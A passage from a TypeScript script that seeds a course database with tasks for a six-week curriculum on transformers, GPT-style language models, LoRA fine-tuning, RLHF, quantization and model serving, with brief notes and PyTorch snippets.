			['Add causal masking', 'Autoregressive generation', '## Causal Mask\n\n```python\nmask = torch.triu(torch.ones(seq, seq), diagonal=1)\nscores.masked_fill_(mask, float(\'-inf\'))\n```'],
			['Implement positional encoding', 'Position information', '## Positional Encoding\n\nSinusoidal (original):\nPE(pos, 2i) = sin(pos/10000^(2i/d))\n\nOr learned embeddings\nOr RoPE (rotary)'],
			['Build transformer block', 'Full block architecture', '## Transformer Block\n\n1. Multi-head attention\n2. Add & LayerNorm\n3. Feed-forward network\n4. Add & LayerNorm'],
		]},
		{ name: 'Week 3-4: Language Models', desc: 'GPT architecture', tasks: [
			['Understand GPT architecture', 'Decoder-only transformer', '## GPT\n\nStack of transformer blocks\nCausal attention only\nNext token prediction'],
			['Implement token embeddings', 'Vocabulary to vectors', '## Embeddings\n\n```python\nself.embed = nn.Embedding(vocab_size, d_model)\n```\n\nLearned lookup table'],
			['Build language model head', 'Predict next token', '## LM Head\n\n```python\nlogits = self.lm_head(hidden)  # -> vocab_size\nprobs = softmax(logits)\n```'],
			['Implement training loop', 'Causal LM training', '## Training\n\nInput: [A, B, C, D]\nTarget: [B, C, D, E]\nLoss: cross-entropy per token'],
			['Add generation loop', 'Autoregressive sampling', '## Generation\n\n```python\nfor _ in range(max_tokens):\n    logits = model(tokens)\n    next_token = sample(logits[-1])\n    tokens.append(next_token)\n```'],
			['Build KV cache', 'Efficient generation', '## KV Cache\n\nCache K, V from previous tokens\nOnly compute K, V for new token\nMuch faster generation'],
		]},
		{ name: 'Week 5-6: Fine-tuning & Deployment', desc: 'Adapt and serve', tasks: [
			['Understand fine-tuning approaches', 'Full vs PEFT', '## Fine-tuning\n\nFull: update all weights\nLoRA: low-rank adapters\nPrefix: learnable prefix tokens\nPrompt: optimize prompts'],
			['Implement LoRA', 'Low-rank adaptation', '## LoRA\n\nW\' = W + BA\nB: d × r, A: r × d\nr << d (e.g., 8)\nOnly train A, B'],
			['Build instruction tuning', 'Follow instructions', '## Instruction Tuning\n\nDataset: (instruction, response)\nTrain to follow instructions\nGeneralizes to new tasks'],
			['Add RLHF basics', 'Preference optimization', '## RLHF\n\n1. Train reward model\n2. PPO to maximize reward\n3. KL penalty to stay close'],
			['Implement quantization', '4-bit inference', '## Quantization\n\nFP16 → INT8 → INT4\nGPTQ, AWQ, bitsandbytes\nTrade precision for speed'],
			['Build serving infrastructure', 'Production deployment', '## Serving\n\nvLLM, TGI, or custom\nBatching for throughput\nStreaming responses'],
		]},
	]);
}

// Continue with remaining paths that have 1-6 tasks...
// This covers the most critical ones. Run and check remaining.

console.log('Done expanding all remaining paths!');

const finalCount = db.prepare(`
	SELECT COUNT(*) as paths,
	(SELECT COUNT(*) FROM modules) as modules,
	(SELECT COUNT(*) FROM tasks) as tasks
	FROM paths
`).get() as { paths: number; modules: number; tasks: number };

console.log(`Final counts: ${finalCount.paths} paths, ${finalCount.modules} modules, ${finalCount.tasks} tasks`);

db.close();
